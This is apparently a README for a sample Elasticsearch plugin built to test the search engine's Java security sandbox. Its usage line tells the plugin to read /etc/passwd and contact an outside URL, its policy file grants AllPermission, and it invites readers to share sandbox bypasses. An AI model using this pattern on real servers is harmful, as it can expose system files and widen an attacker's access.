Elasticsearch plugin to read local files  and send request
===========================

## Compile and pack

Change the elasticsearch plugins version number in `elasticsearch/plugin-descriptor.properties`, here is 6.2.3.
Then
```
mvn clean package
cp target/elasticsearch-plugin-sample-6.6.0-SNAPSHOT.jar elasticsearch/
zip -r elasticsearch-plugin-sample-6.6.1-SNAPSHOT.zip elasticsearch
```

** Note **

You do not need to  package it in `elasticsearch` folder at the version `6.5.4` above, just pack it as:

```
# Firstly, change  the version number in descriptor file.

mvn clean package
cp target/elasticsearch-plugin-sample-6.6.0-SNAPSHOT.jar elasticsearch/
cd elasticsearch/
zip elasticsearch-plugin-sample-6.5.4-SNAPSHOT.zip elasticsearch-plugin-sample-*-SNAPSHOT.jar plugin-descriptor.properties plugin-security.policy
```

## Install

```
elasticsearch-plugin install file:///elasticsearch-plugin-sample-6.6.1-SNAPSHOT.zip
```

### Usage

```
curl "http://127.0.0.1:9200/_sample?path=/etc/passwd&url=http://google.com"
```


### Notice

This plugins ask for some other permissions in `elasticsearch/plugin-security.policy`  as below:

```
grant {
	permission java.lang.RuntimePermission "setSecurityManager";
	permission java.io.FilePermission "/etc/passwd", "read";
	permission java.security.AllPermission;
};
```
Use it before you known what you are doing.

This plugins cannot run any command, spawn any process or something like that, because the sandbox of elasticsearch do not allow, it allow:

```
FilePermissions(read,write)
SocketPermissions(connect, listen, accept)
URLPermission,PropertyPermission,...
```

If you know some way to bypass it, tell me please. :)


### Reference

https://spinscale.de/posts/2020-04-07-elasticsearch-securing-a-search-engine-while-maintaining-usability.html
https://github.com/codelibs/elasticsearch-plugin-sample
https://discuss.elastic.co/t/customize-java-security-manager-settings/72255
https://github.com/elastic/elasticsearch/blob/7.7/server/src/main/java/org/elasticsearch/bootstrap/ESPolicy.java
https://github.com/spinscale/talk-elasticsearch-security-manager-and-seccomp/blob/master/src/main/java/de/spinscale/security/samples/SecurityManagerSamples.java
https://blog.csdn.net/goodluck_mh/article/details/92845023








